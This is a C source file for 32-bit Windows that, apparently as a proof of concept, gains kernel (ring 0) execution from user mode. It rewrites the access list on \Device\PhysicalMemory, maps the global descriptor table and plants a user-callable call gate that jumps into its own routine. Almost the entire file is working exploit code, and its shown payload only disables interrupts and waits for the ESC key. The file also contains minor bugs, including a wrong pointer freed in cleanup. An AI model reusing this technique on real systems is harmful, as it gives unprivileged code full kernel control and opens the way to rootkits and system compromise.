#include <windows.h>
#include <winnt.h>

#ifdef RTL
	#include "rtl.c"
#else
	#include <stdio.h>
	#include <conio.h>
#endif

#include <accctrl.h>
#include <aclapi.h>

#include "native.h"
#include "ntdll.h"

#define DEBUG  __asm int 3;
#define _MmGetPhysicalAddress(vaddr) ((vaddr<0x80000000||vaddr>=0xA0000000)?\
					0:vaddr&0x1FFFF000)
typedef struct gdtr { 
	short Limit; 
	short BaseLow; 
	short BaseHigh; 
 } Gdtr_t, *PGdtr_t;

typedef struct { 
	unsigned short offset_0_15;
	unsigned short selector;
	unsigned char param_count:  4;
	unsigned char some_bits:  4;
	unsigned char type:  4;
	unsigned char app_system:  1;
	unsigned char dpl:  2;
	unsigned char present:  1;
	unsigned short offset_16_31;
  } CALLGATE_DESCRIPTOR;

void Ring0Code (void)
{
__asm cli;

WaitESC:
__asm in al, 60h;
__asm cmp al, 1;
__asm jne WaitESC;

__asm sti;
__asm retf;
}
//-----------------------------------------------------------------------------
VOID GainSectionAccess(HANDLE hSection) 
    { 
	PACL pDacl=NULL; 
	PACL pNewDacl=NULL; 
	PSECURITY_DESCRIPTOR pSD=NULL; 
	DWORD dwRes; 
	EXPLICIT_ACCESS ea; 

	if(dwRes=GetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION, 
		NULL,NULL,&pDacl,NULL,&pSD)!=ERROR_SUCCESS) { 
	printf( "GetSecurityInfo Error %u\n", dwRes ); 
	goto CleanUp; 
	} 

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS)); 
	ea.grfAccessPermissions = SECTION_MAP_WRITE; 
	ea.grfAccessMode = GRANT_ACCESS; 
	ea.grfInheritance= NO_INHERITANCE; 
	ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME; 
	ea.Trustee.TrusteeType = TRUSTEE_IS_USER; 
	ea.Trustee.ptstrName = "CURRENT_USER"; 

	if(dwRes=SetEntriesInAcl(1,&ea,pDacl,&pNewDacl)!=ERROR_SUCCESS) { 
	printf( "SetEntriesInAcl %u\n", dwRes ); 
	goto CleanUp; 
	} 

       if(dwRes=SetSecurityInfo(hSection,SE_KERNEL_OBJECT,DACL_SECURITY_INFORMATION,
				NULL,NULL,pNewDacl,NULL)!=ERROR_SUCCESS) { 
	printf("SetSecurityInfo %u\n",dwRes); 
	goto CleanUp; 
	} 

CleanUp: 
	if(pSD) 
	 LocalFree(pSD); 
	if(pNewDacl) 
	 LocalFree(pSD); 
}
//-----------------------------------------------------------------------------
HANDLE OpenPhysicalMemory(DWORD privil)
{
NTSTATUS		status;
HANDLE			physmem;
UNICODE_STRING		physmemString;
OBJECT_ATTRIBUTES 	attributes;
WCHAR			physmemName[] = L"\\device\\physicalmemory";

RtlInitUnicodeString( &physmemString, physmemName );	
InitializeObjectAttributes( &attributes, &physmemString,OBJ_CASE_INSENSITIVE,
				 NULL, NULL );			
status = NtOpenSection( &physmem, privil, &attributes );

if( !NT_SUCCESS( status )) 
	return NULL;
return physmem;
}
//-----------------------------------------------------------------------------
int main (void)
{
HANDLE hPmem;
Gdtr_t gdt;

__asm sgdt pword ptr gdt;
hPmem = OpenPhysicalMemory(SECTION_MAP_READ|SECTION_MAP_WRITE);

if (!hPmem) {
	hPmem = OpenPhysicalMemory(READ_CONTROL|WRITE_DAC);
	GainSectionAccess(hPmem);
	hPmem = OpenPhysicalMemory (SECTION_MAP_READ|SECTION_MAP_WRITE);
        }
if (!hPmem) {
	printf ("\nError: couldn't open \"\Device\PhysicalMemory\".");
	return 0;
	}

ULONG mapaddr = _MmGetPhysicalAddress((ULONG)((gdt.BaseHigh<<16U)|gdt.BaseLow));
printf("\nGDT Address> 0x%08X", mapaddr);

PVOID base_addr; 
base_addr=MapViewOfFile(hPmem, FILE_MAP_READ|FILE_MAP_WRITE, 0,
			 mapaddr, (gdt.Limit+1));
 
if(!base_addr) { 
	printf("Error: MapViewOfFile failed."); 
	return 0; 
	}
printf("\nBaseAddress> 0x%08X", base_addr);

CALLGATE_DESCRIPTOR* cgate;
for(cgate=(CALLGATE_DESCRIPTOR*)base_addr+1; //skip 0
	(ULONG)cgate<(ULONG)(base_addr)+gdt.Limit+1;cgate++)
{
	if(cgate->type == 0) {
		printf("\nFound empty gdt descriptor> 0x%08X", (ULONG)cgate);

		cgate->offset_0_15 = LOWORD(Ring0Code); 
		cgate->selector = 8; 
		cgate->param_count = 0; 
		cgate->some_bits = 0; 
		cgate->type = 0xC;
		cgate->app_system = 0;
		cgate->dpl = 3;//DPL=3
		cgate->present = 1; 
		cgate->offset_16_31 = HIWORD(Ring0Code); 

		WORD farcall[3]; 
		farcall[2]=((short)((ULONG)cgate-(ULONG)base_addr))|3;
		VirtualLock((PVOID)Ring0Code,4095); //ne objazatelno
		__asm call fword ptr [farcall] 

		NtClose(hPmem);
		return 1;
		}
}
NtClose(hPmem);
return 0;
}